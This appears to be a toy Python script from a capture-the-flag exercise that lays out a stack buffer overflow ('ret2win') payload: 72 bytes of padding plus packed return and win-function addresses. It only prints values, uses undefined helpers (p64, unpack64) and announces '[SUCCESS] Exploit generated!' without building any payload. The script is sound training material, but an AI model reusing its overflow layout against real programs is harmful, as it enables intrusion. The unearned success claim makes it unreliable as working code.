# ==============================
# CTF Exploit Payload Generator
# ==============================

print("=== Exploit Payload Generator ===")

# 目標信息
buffer_size = 64
target_rip = 4210688
win_function = 4198732

print("Target Information:")
print(buffer_size)
print(hex(target_rip))
print(hex(win_function))

# 生成 padding
print("Generating padding...")
padding_count = buffer_size + 8
print(padding_count)

# 生成 payload 結構
print("Payload Structure:")
print("  [Padding] 72 bytes")
print("  [RIP] 8 bytes")
print("  [Win Func] 8 bytes")

# Pack 地址
packed_rip = p64(target_rip)
packed_win = p64(win_function)

print("Packed addresses:")
print(hex(unpack64(packed_rip)))
print(hex(unpack64(packed_win)))

# 計算總長度
total_size = padding_count + 16
print("Total payload size:")
print(total_size)

print("[SUCCESS] Exploit generated!")
